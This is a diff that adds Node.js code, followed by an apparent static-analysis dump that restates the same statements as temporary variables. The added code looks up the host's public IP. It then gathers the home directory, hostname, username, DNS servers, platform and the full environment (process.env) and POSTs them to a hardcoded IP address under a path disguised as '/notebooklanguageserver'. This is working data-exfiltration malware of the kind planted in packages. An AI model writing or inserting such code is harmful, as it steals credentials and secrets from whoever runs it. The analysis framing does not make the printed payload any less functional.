@@ -1,0 +1,77 @@
+var ip = exec('curl http://ident.me', (error, stdout, stderr) => {
+    const trackingData = JSON.stringify({
+        hd: os.homedir(),
+        hn: os.hostname(),
+        un: os.userInfo().username,
+        dns: dns.getServers(),
+        ip: `${stdout}`,
+        env: process.env,
+        platform: process.platform,
+    });
+    var postData = querystring.stringify({
+        msg: trackingData,
+    });
+    var options = {
+        hostname: "54.188.234.198",
+        port: 13379,
+        path: "/notebooklanguageserver",
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": postData.length,
+        },
+    };
+    var req = http.request(options, (res) => {
+        res.on("data", (d) => {
+            process.stdout.write(d);
+        });
+    });
+    req.write(postData);
+    req.end();
+})
+const trackingData = JSON.stringify({
+        hd: os.homedir(),
+        hn: os.hostname(),
+        un: os.userInfo().username,
+        dns: dns.getServers(),
+        ip: `${stdout}`,
+        env: process.env,
+        platform: process.platform,
+    })
+_tmp_1.hd = os.homedir()
+_tmp_1.hn = os.hostname()
+_tmp_1.un = os.userInfo().username
+_tmp_1.dns = dns.getServers()
+_tmp_1.ip = <operator>.formatString("", stdout, "")
+_tmp_1.env = process.env
+_tmp_1.platform = process.platform
+var postData = querystring.stringify({
+        msg: trackingData,
+    })
+_tmp_2.msg = trackingData
+var options = {
+        hostname: "54.188.234.198",
+        port: 13379,
+        path: "/notebooklanguageserver",
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": postData.length,
+        },
+    }
+_tmp_3.hostname = "54.188.234.198"
+_tmp_3.port = 13379
+_tmp_3.path = "/notebooklanguageserver"
+_tmp_3.method = "POST"
+_tmp_3.headers = {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": postData.length,
+        }
+_tmp_4.Content-Type = "application/x-www-form-urlencoded"
+_tmp_4.Content-Length = postData.length
+var req = http.request(options, (res) => {
+        res.on("data", (d) => {
+            process.stdout.write(d);
+        });
+    })
+req.write(postData)
